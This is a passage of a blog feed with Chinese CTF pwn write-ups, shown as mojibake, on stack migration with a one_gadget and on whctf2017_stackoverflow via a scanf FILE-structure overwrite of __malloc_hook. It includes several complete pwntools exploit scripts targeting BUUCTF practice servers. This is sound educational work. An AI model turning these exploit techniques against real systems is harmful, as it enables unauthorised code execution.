ˆè¿ç§»çš„ã€‚</p><p>è¿™é“é¢˜ç”±äºæ²¡åŠæ³•æ³„éœ²æ ˆåœ°å€ï¼Œå› æ­¤è¿ç§»çš„è¯ï¼Œè‚¯å®šå°±æ˜¯bssæ®µã€‚ç¬¬ä¸€æ¬¡åœ¨bssæ®µè¾“å…¥å†…å®¹çš„è¯ï¼Œä¸€å…±åªèƒ½è¾“å…¥32å­—èŠ‚ï¼Œé™¤å»8å­—èŠ‚çš„adminï¼ˆadminåé¢è¿˜éœ€è¦å†å¡«å……3ä¸ª00ï¼Œç”¨äºè¡¥é½è¿™ä¸€ä¸ªå†…å­˜å•å…ƒï¼‰ï¼Œåªå‰©ä¸‹äº†24å­—èŠ‚ï¼Œæˆ‘ä»¬è‚¯å®šæ˜¯è€ƒè™‘ret2libcçš„ï¼Œé‚£ç°åœ¨è¦åšçš„å°±æ˜¯æ³„éœ²å‡ºæ¥ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ã€‚</p><p>é—®é¢˜æ˜¯pop rdiå å…«å­—èŠ‚ï¼Œå‚æ•°å å…«å­—èŠ‚ï¼Œæ‰§è¡Œputsåˆå å…«å­—èŠ‚ï¼Œè¿™æ ·çœ‹æ¥ï¼Œæˆ‘ä»¬ä¼¼ä¹æ˜¯æ²¡åŠæ³•æ§åˆ¶è¿”å›åœ°å€äº†ã€‚</p><p>é‚£è¿™ä»¶äº‹å…ˆç¼“ä¸€ç¼“ï¼Œæˆ‘ä»¬å†æƒ³ä¸€ä¸‹ï¼Œæ³„éœ²å‡ºæ¥äº†çœŸå®åœ°å€ä¹‹åï¼Œè‚¯å®šæ˜¯è¦å†æ¥ä¸€æ¬¡è¾“å…¥ï¼Œå°†one_gadgetçš„åœ°å€å†™å…¥å†…å­˜ã€‚åŒæ—¶è¿˜éœ€è¦æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œå»æ‰§è¡Œè¿™ä¸ªone_gadgetã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œæƒ³å®Œæˆè¿™ä»¶äº‹æƒ…ï¼Œä¼¼ä¹æˆ‘ä»¬åªèƒ½æ˜¯å†è·‘ä¸€æ¬¡ç¨‹åºï¼ŒåŒæ—¶åœ¨è·‘ä¹‹å‰è¿˜éœ€è¦æ‰§è¡Œä¸ªputså‡½æ•°ã€‚</p><p><img src="/../img/2706180-20220331215315108-697859807.png"></p><p>é‚£æˆ‘ä»¬æŠŠæ‰§è¡Œputsçš„åœ°å€å†™æˆ0x4018B5,è¿™æ ·å®ƒä¸ä½†æ‰§è¡Œäº†putså‡½æ•°ï¼ŒåŒæ—¶è®©ç¨‹åºçš„æ‰§è¡Œæµåˆä»sub_4018c7å‡½æ•°ï¼ˆè¿™ä¸ªå‡½æ•°å°±æ˜¯ç¨‹åºçš„ä¸»è¦éƒ¨åˆ†ï¼‰å¼€å§‹è·‘äº†ã€‚</p><h2 id="é€šè¿‡è°ƒè¯•æ¥è¿›ä¸€æ­¥åˆ†æ"><a href="#é€šè¿‡è°ƒè¯•æ¥è¿›ä¸€æ­¥åˆ†æ" class="headerlink" title="é€šè¿‡è°ƒè¯•æ¥è¿›ä¸€æ­¥åˆ†æ"></a>é€šè¿‡è°ƒè¯•æ¥è¿›ä¸€æ­¥åˆ†æ</h2><p>ç„¶åæ­¤æ—¶åº”è¯¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹ç¨‹åºçš„æƒ…å†µã€‚å†åšè¿›ä¸€æ­¥å®Œå–„expã€‚</p><p><img src="/../img/2706180-20220331215325473-1898764410.png"></p><p>æ­¤æ—¶æ˜¯åœ¨ç¬¬äºŒæ¬¡æ‰§è¡Œå¾€bssæ®µè¾“å…¥çš„é‚£ä¸ªreadå‡½æ•°ï¼Œå¯ä»¥çœ‹å‡ºæ¥ç°åœ¨è¿˜ä¸€åˆ‡æ­£å¸¸ã€‚ä¼¼ä¹åªè¦å¸ƒç½®ä¸€ä¸ªadminå’Œone_gadgetåœ°å€ï¼Œç„¶åç¬¬äºŒæ¬¡åˆ©ç”¨é‚£ä¸ªreadå®Œæˆä¸€æ¬¡è¿ç§»å°±è¡Œäº†ï¼Œä½†æ˜¯äº‹å®çœŸçš„è¿™ä¹ˆç®€å•ä¹ˆï¼Ÿ</p><p><img src="/../img/2706180-20220331215334034-1303724362.png"></p><p>ç°åœ¨æ¥åˆ°äº†ç¬¬äºŒæ¬¡å¾€æ ˆé‡Œè¾“å…¥çš„readï¼Œå¯ä»¥å‘ç°å®ƒè¾“å…¥çš„å†…å®¹æ˜¯å¾€0x6023f0è¾“å…¥çš„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åˆšåˆšè¾“å…¥çš„adminå’Œone_gadgetä¼šè¢«è¿™æ¬¡è¾“å…¥çš„å†…å®¹æ‰€è¦†ç›–ï¼ˆå› ä¸ºæˆ‘ä»¬ç°åœ¨çš„æ ˆå°±å·²ç»åœ¨bssæ®µäº†ï¼Œå› æ­¤è¿™æ¬¡è¾“å…¥ä¼šå¹²æ‰°ç¬¬ä¸€æ¬¡è¾“å…¥ï¼‰ã€‚å…ˆæ³¨æ„ä¸€ä¸‹rbpçš„å€¼ï¼Œæˆ‘ä»¬ç¬¬äºŒæ¬¡è¾“å…¥çš„ç›®çš„å°±æ˜¯åœ¨ä¸ç ´åone_gadgetçš„æƒ…å†µä¸‹ï¼Œè¦†ç›–rbpè¿ç§»åˆ°one_gadgetè¿™é‡Œã€‚ç°åœ¨è¿™é‡Œçš„è¾“å…¥è·ç¦»rbpè¿˜æœ‰32ä¸ªå­—èŠ‚ã€‚è¿™å°±æ„å‘³ç€æˆ‘ä»¬è¦æ˜¯æƒ³æ§åˆ¶è¿™ä¸ªrbpå°±å¿…é¡»è¦†ç›–ä¹‹å‰å†™çš„one_gadgetäº†ã€‚</p><p>ä¸è¿‡æœ€å…³é”®çš„ä¸€ç‚¹æ˜¯ä¸æ˜¯è¢«å¿½ç•¥äº†ï¼Œå¾€bssæ®µè¾“å…¥çš„é‚£ä¸ªreadå‡½æ•°ï¼Œå¯ä»¥è¾“å…¥32å­—èŠ‚ï¼Œå¦‚æœæˆ‘ä»¬æŠŠone_gadgetç»™æŠ¬é«˜å‘¢ï¼ŸæŠ¬é«˜åˆ°ç¬¬24å­—èŠ‚å†å¸ƒç½®ï¼ˆç›¸å½“äº0x602400åœ°å€æ¥è¯´ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶çš„one_gadgetåº”è¯¥æ˜¯åœ¨0x602418çš„ä½ç½®ï¼‰ï¼Œè€Œæˆ‘ä»¬å†è¾“å…¥32å­—èŠ‚çš„è¯å†å†™rbpçš„è¯ï¼Œè¿™ä¸ªrbpä¹Ÿæ‰æ˜¯åœ¨0x602410è¿™ä¸ªä½ç½®ï¼ˆç¬¬äºŒæ¬¡è¾“å…¥æ˜¯ç›¸å½“äº0x6023f0æ¥è¯´ï¼‰ï¼Œè¿™æ ·rbpå°±æ²¡æœ‰å¹²æ‰°åˆ°one_gadget</p><p>æˆ–è€…ç”¨å¦ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡å°±è¾“å…¥ä¸€ä¸ªadminï¼Œç¬¬äºŒæ¬¡è¾“å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬åŒæ—¶å¸ƒç½®one_gadgetå’Œè¦†ç›–rbpã€‚æ§åˆ¶rbpå»è¿ç§»åˆ°one_gadgetä¸Šé¢ï¼ŒäºŒè€…çš„æ ¸å¿ƒæ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p>ç„¶åå°±expåŸºæœ¬å°±å‡ºæ¥äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ‰“è¿œç¨‹ï¼Œone_gadgetæœç´¢çš„æ˜¯ç”¨é¢˜ç›®ç»™çš„libcï¼Œå¦‚æœçš„æ‰“æœ¬åœ°ï¼Œone_gadgetæœè‡ªå·±æœ¬åœ°çš„libcã€‚ï¼ˆå¦å¤–å°±æ˜¯ï¼Œè¿™é“é¢˜ç”¨ä¸äº†systemåŠ å‚æ•°&#x2F;bin&#x2F;shè·å–shellï¼Œä¸ä¿¡çš„è¯ï¼Œè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼‰</p><h1 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#è¿™é‡Œæœ¬åœ°è¿˜æ˜¯è¿œç¨‹ï¼Œè‡ªå·±åˆ‡æ¢ä¸€ä¸‹åº“</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>+<span class="number">0x18</span>)<span class="comment">#è¿ç§»åˆ°one_gadget</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™ä¸ªæ˜¯ç¬¬ä¸€æ¬¡åªè¾“å…¥adminï¼Œç¬¬äºŒæ¬¡åŒæ—¶å¸ƒç½®one_gadgetå’Œæ§åˆ¶rbpçš„expã€‚å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªexpå’Œä¸Šé¢çš„åŒºåˆ«ä¹Ÿä»…ä»…æ˜¯æœ€åä¸€ç‚¹ä¸ä¸€æ ·ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220331215347474-154784131.png"></p><p>psï¼šæœ€åå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™ä¸¤ä¸ªexpï¼Œç¬¬ä¸€ä¸ªæœ€åæ˜¯å¹¶æ²¡æœ‰æ‰§è¡Œä¸¤æ¬¡leave;retè·å–shellçš„ï¼Œè€Œæ˜¯æ‰§è¡Œäº†ä¸€æ¬¡leaveå°±è·å–äº†shellï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ‰§è¡Œä¸¤å›leave;retæ‰èƒ½è·å–shellã€‚ç»è¿‡è°ƒè¯•ï¼Œæˆ‘è¿˜æ˜¯æ²¡æœ‰å‘ç°è¿™ç§å·®å¼‚çš„æ ¹æœ¬åŸå› æ˜¯åœ¨å“ªé‡Œã€‚å¦‚æœå„ä½å¸ˆå‚…æœ‰å¼„çš„è¿™ä¸ªé—®é¢˜çš„ï¼Œè¿˜è¯·å‘ŠçŸ¥æˆ‘è¿™ä¸ªèœé¸¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> MD5åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>whctf2017 pwné¢˜wp</title>
      <link href="/posts/1694f8f0.html"/>
      <url>/posts/1694f8f0.html</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©åšé¢˜çš„æ—¶å€™æ— æ„åšäº†ä¸€é“buuä¸Šçš„whctf2017 stackoverflow,åšå®Œä¹‹åå‘ç°å¦å¤–å‡ é“whctf2017çš„é¢˜ç›®ä¹Ÿå¾ˆä¸é”™ï¼Œå°±æ‰“ç®—å…¨åšäº†éƒ½å­¦ä¹ ä¸€ä¸‹ï¼Œé¢˜ç›®å…¨éƒ¨åœ¨buuä¸Šéƒ½å¯ä»¥æ‰¾åˆ°</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç®€å•æ€»ç»“ä¸€ä¸‹è¿™å››é“é¢˜ï¼Œå®ƒä»¬åˆ†åˆ«è€ƒå¯Ÿäº†å¦‚ä¸‹çš„çŸ¥è¯†ç‚¹ï¼š</p><p>ç¬¬ä¸€é¢˜è€ƒå¯Ÿäº†scanfå‡½æ•°æœ€ç»ˆçš„è¾“å…¥æ˜¯åœ¨å†…éƒ¨çš„<code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code>è¿™è¡Œä»£ç ï¼Œåªè¦èƒ½æ§åˆ¶è¿™å‡ ä¸ªå­—æ®µå¹¶ä¸”å¯¹å…¶ä»–ä¸€äº›å­—æ®µè¿›è¡Œç»•è¿‡ï¼Œå°±å¯ä»¥å®ç°IOçš„ä»»æ„åœ°å€å†™</p><p>ç¬¬äºŒé¢˜è€ƒå¯Ÿäº†æ¡ä»¶ç«äº‰æ¼æ´ï¼Œåœ¨å¤šçº¿ç¨‹çš„æ“ä½œä¸­è®¿é—®åŒä¸€ä¸ªå…¨å±€å˜é‡æ²¡æœ‰åŠ é”ï¼Œåœ¨deleteå‡½æ•°ä¸­è®©å…¨å±€æŒ‡é’ˆè¢«å‡åˆ°äº†ä½äºgotè¡¨çš„ä½ç½®ï¼Œä»è€Œmallocç”³è¯·å †å—çš„åœ°å€å†™å…¥äº†gotè¡¨é‡Œï¼Œæ²¡æœ‰å¼€NXå¯¼è‡´å †å¯æ‰§è¡Œï¼Œä»è€ŒåŠ«æŒgotè¡¨è·³è½¬åˆ°å †çš„shellcodeä¸Š</p><p>ç¬¬ä¸‰é¢˜è€ƒå¯Ÿçš„æ˜¯snprintfæ‰§è¡Œä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œsnprintfæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦æ¥å¤„ç†çš„ï¼Œå¯èƒ½æ˜¯é‡‡å–äº†ä¸€ç§å¾ªç¯éå†çš„æ–¹å¼ï¼Œæ‰€ä»¥å³ä½¿æœ€åˆè°ƒç”¨snprintfçš„æ—¶å€™formatæ˜¯%sï¼Œä½†åç»­çš„æ“ä½œä¸­formatè¢«æ”¹å˜äº†ï¼Œç„¶åå†å–æ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™è§¦å‘äº†æ¼æ´ã€‚<strong>snprintfæ‹·è´å­—ç¬¦çš„æ—¶å€™å¯èƒ½å­˜åœ¨æº¢å‡º</strong></p><p>ç¬¬å››é¢˜è€ƒå¯Ÿçš„æ˜¯æœªåˆå§‹åŒ–æ¼æ´ï¼Œåœ¨æ‰“å°ä¹‹å‰ï¼Œæ²¡æœ‰å¯¹æ“ä½œçš„æŒ‡é’ˆè¿›è¡Œåˆå§‹åŒ–ï¼Œä»è€Œä½¿ç”¨äº†æ ˆé‡Œçš„æ®‹ç•™æ•°æ®ï¼Œæ³„éœ²å‡ºäº†canaryï¼Œé…åˆgetsçš„æ ˆæº¢å‡ºæ¼æ´ï¼Œret2libcè·å–shell</p><h2 id="whctf2017-stackoverflow"><a href="#whctf2017-stackoverflow" class="headerlink" title="whctf2017_stackoverflow"></a>whctf2017_stackoverflow</h2><h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846592.png" alt="image-20221213084612401" style="zoom:50%;" /><h3 id="æ¼æ´æ‰€åœ¨"><a href="#æ¼æ´æ‰€åœ¨" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h3><p>ç¬¬ä¸€ä¸ªæ¼æ´ç‚¹æ˜¯å¾€æ ˆé‡Œè¾“å…¥æ•°æ®ä¹‹åæ²¡æœ‰0æˆªæ–­ï¼Œå¹¶ä¸”ä½¿ç”¨äº†%sæ‰“å°æ•°æ®ï¼Œä»è€Œå¯ä»¥æ³„éœ²æ ˆé‡Œå­˜å‚¨çš„libcåœ°å€(å¦‚ä¸‹)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846562.png" alt="image-20221213084641509" style="zoom:50%;" /><p>ç¬¬äºŒä¸ªæ¼æ´æ˜¯v2å’Œsizeå¯ä»¥ä¸ä¸€æ ·ï¼Œå¦‚æœsizeå¤§äº0x300000çš„è¯ï¼Œå¯ä»¥é‡æ–°è¾“å…¥size(ä½†æ˜¯v2æ²¡æœ‰è¢«æ›´æ–°)ï¼Œè€Œmallocå‡½æ•°ç”³è¯·å¤§äº128KB(0x20000 bit)çš„å†…å­˜æ—¶ä¼šè°ƒç”¨mmapåœ¨å†…å­˜å…±äº«åŒºæ˜ å°„å‡ºæ¥ä¸€å—å†…å­˜ï¼Œè¿™ç‰‡å†…å­˜å’Œlibcé‡Œçš„åœ°å€å­˜åœ¨å›ºå®šåç§»ï¼Œæˆ‘ä»¬æå‰æ§åˆ¶ä¸€ä¸ªv2çš„è¯å°±å¯ä»¥å‘ä»»æ„ä¸€ä¸ªlibcåœ°å€å†™å…¥ä¸€ä¸ª0(å¦‚ä¸‹)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130903387.png" alt="image-20221213090336309" style="zoom:50%;" /><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>scanfçš„è°ƒç”¨æµç¨‹ä¸ºscanf-&gt;vfscanf-&gt;__uflow-&gt;_IO_default_uflow()-&gt;underflow-&gt;_IO_file_underflow()</p><p>åœ¨æœ€åçš„è¿™ä¸ªå‡½æ•°ä¸­æœ‰æ®µä»£ç è°ƒç”¨äº†read  å¦‚ä¸‹</p><p><code>count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code></p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶IO_buf_baseï¼Œå¹¶ä¸”ä¿è¯_IO_buf_end - _IO_buf_baseä¸ä¸º0ï¼Œå°±èƒ½å®ç°åœ°å€ä»»æ„å†™çš„ç›®çš„ã€‚</p><p>ä¸è¿‡éœ€è¦ç»•è¿‡ä¸‹é¢çš„æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯è¦IO_read_ptrç­‰äºIO_read_end</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *)fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„æ€è·¯æ˜¯å‘_IO_buf_baseçš„åœ°å€é‡Œå†™å…¥ä¸€ä¸ª0ï¼Œä»è€Œå»å†æ¬¡æ§åˆ¶_IO_buf_baseå­—æ®µã€‚å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131100968.png" alt="image-20221213110056374" style="zoom:50%;" /><p>æ­¤æ—¶çš„buf_baseä¸­çš„åœ°å€æœ«å°¾å·²ç»è¢«ç¯¡æ”¹ä¸ºäº†00ï¼Œæ‰€ä»¥ä¸‹æ¬¡å¯ä»¥å‘0x7f8d614a3900è¿™ä¸ªåœ°å€é‡Œå†™å…¥(buf_end-buf_base)ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œè¯¥åœ°å€æ˜¯_IO_write_baseå­—æ®µï¼Œä¸‹æ¬¡è¾“å…¥çš„è¯ï¼Œæˆ‘ä»¬æ§åˆ¶buf_baseä¸ºmalloc_hookçš„åœ°å€ï¼Œè€Œbuf_endè‡³å°‘è¦ä¸ºmalloc_hook-8ï¼ˆå› ä¸ºbuf_end-buf_baseå°±æ˜¯ä¸‹æ¬¡å¾€malloc_hooké‡Œå†™å…¥çš„å­—èŠ‚æ•°ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131101394.png" alt="image-20221213110142157"></p><p>ç¯¡æ”¹åçš„buf_baseå’Œbuf_endå¦‚ä¸‹ï¼Œæ­¤æ—¶è¿˜æ— æ³•å¾€malloc_hooké‡Œå†™å…¥æ•°æ®ï¼Œå› ä¸º_IO_read_ptrå’Œ_IO_read_endå¹¶ä¸ç›¸åŒã€‚è€Œå½“å‰å‡½æ•°è¢«ä¸æ–­å¾ªç¯ï¼Œå…¶ä¸­IO_getc(stdin)å‡½æ•°å¯ä»¥åˆ·æ–°_IO_read_ptrï¼Œè®©å…¶ä»è¾“å…¥ç¼“å†²åŒºä¸­è¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå¹¶ä¸”è®©read_ptræŒ‡é’ˆåŠ 1ï¼Œå› æ­¤æˆ‘ä»¬éšä¾¿è¾“å…¥æ•°æ®ï¼Œè§¦å‘getcå‡½æ•°39æ¬¡å°±å¯ä»¥è®©read_ptrå’Œread_endç›¸åŒï¼Œä»è€Œå¾€malloc_hooké‡Œå†™å…¥one_gadgetï¼Œåœ¨ä¹‹åè°ƒç”¨mallocå‡½æ•°çš„æ—¶å€™å³å¯è·å–shell</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131104947.png" alt="image-20221213110433209"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25978&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;leave your name, bro:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x7b947</span><span class="comment">#-0x7b957#</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x5c5908</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x200000</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">debug(p,<span class="number">0x400A45</span>,<span class="number">0x4008FF</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x18</span>+p64(malloc_hook)+p64(malloc_hook+<span class="number">0x8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;padding and ropchain: &quot;</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;please input the size to trigger stackoverflow: &quot;</span>,p64(search_og(<span class="number">3</span>)+libc_base))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131111298.png" alt="image-20221213111146066"></p><h2 id="whctf2017-note-sys"><a href="#whctf2017-note-sys" class="headerlink" title="whctf2017_note_sys"></a>whctf2017_note_sys</h2><h3 